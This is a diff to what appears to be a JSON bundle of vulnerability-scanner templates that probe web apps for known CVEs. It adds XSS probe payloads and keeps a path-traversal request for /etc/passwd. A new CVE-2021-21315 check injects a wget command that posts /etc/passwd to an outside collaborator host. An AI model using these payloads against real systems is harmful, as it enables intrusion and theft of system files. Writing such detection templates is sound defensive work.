@@ -3000,6 +3000,7 @@
               "type": "status"
             },
             {
+              "condition": "and",
               "part": "body",
               "type": "word",
               "words": [
@@ -3563,11 +3564,19 @@
             {
               "condition": "and",
               "part": "body",
-              "regex": [
-                "uid(.*)",
-                "gid(.*)"
-              ],
-              "type": "regex"
+              "type": "word",
+              "words": [
+                "uid=",
+                "gid=",
+                "groups="
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/plain"
+              ]
             },
             {
               "status": [
@@ -3737,7 +3746,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "\"><script>alert(1)</script>"
+                "<svg/onload=alert(xss)>"
               ]
             },
             {
@@ -3757,7 +3766,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/webapp/?fccc0\"><script>alert(1)</script>5f43d=1"
+            "{{BaseURL}}/webapp/?fccc%27\\%22%3E%3Csvg/onload=alert(xss)%3E"
           ]
         }
       ]
@@ -4753,7 +4762,7 @@
         "author": "pikpikcu",
         "description": "Apache Kylin 2.0.0, 2.1.0, 2.2.0, 2.3.0, 2.3.1, 2.3.2, 2.4.0,\n2.4.1, 2.5.0, 2.5.1, 2.5.2, 2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4,\n2.6.5, 2.6.6, 3.0.0-alpha, 3.0.0-alpha2, 3.0.0-beta, 3.0.0, 3.0.1,\n3.0.2, 3.1.0, 4.0.0-alpha has one restful api which exposed\nKylin's configuration information without any authentication,\nso it is dangerous because some confidential information entries will be disclosed to everyone.\n",
         "name": "Apache Kylin Unauth",
-        "reference": "ttps://nvd.nist.gov/vuln/detail/CVE-2020-13937",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-13937",
         "severity": "medium",
         "tags": "cve,cve2020,apache"
       },
@@ -4770,7 +4779,6 @@
               "type": "status"
             },
             {
-              "condition": "and",
               "part": "header",
               "type": "word",
               "words": [
@@ -4782,7 +4790,8 @@
               "part": "body",
               "type": "word",
               "words": [
-                "config"
+                "config",
+                "kylin.metadata.url"
               ]
             }
           ],
@@ -5497,7 +5506,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<svg/onload=alert(1)>"
+                "<svg/onload=alert(xss)>"
               ]
             },
             {
@@ -5517,7 +5526,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/control/stream?contentId=<svg/onload=alert(1)>"
+            "{{BaseURL}}/control/stream?contentId=%27\\%22%3E%3Csvg/onload=alert(xss)%3E"
           ]
         }
       ]
@@ -7560,6 +7569,51 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/dataservice/disasterrecovery/download/token/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Fetc%2Fpasswd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-21315",
+      "info": {
+        "author": "pikpikcu",
+        "name": "Node.js Systeminformation Command Injection",
+        "reference": "https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC",
+        "severity": "high",
+        "tags": "nodejs,cve,cve2021"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "application/json"
+              ]
+            },
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "wget --post-file /etc/passwd burpcollaborator.net",
+                "name",
+                "running",
+                "pids"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/api/getServices?name[]=$(wget%20--post-file%20/etc/passwd%20burpcollaborator.net)"
           ]
         }
       ]
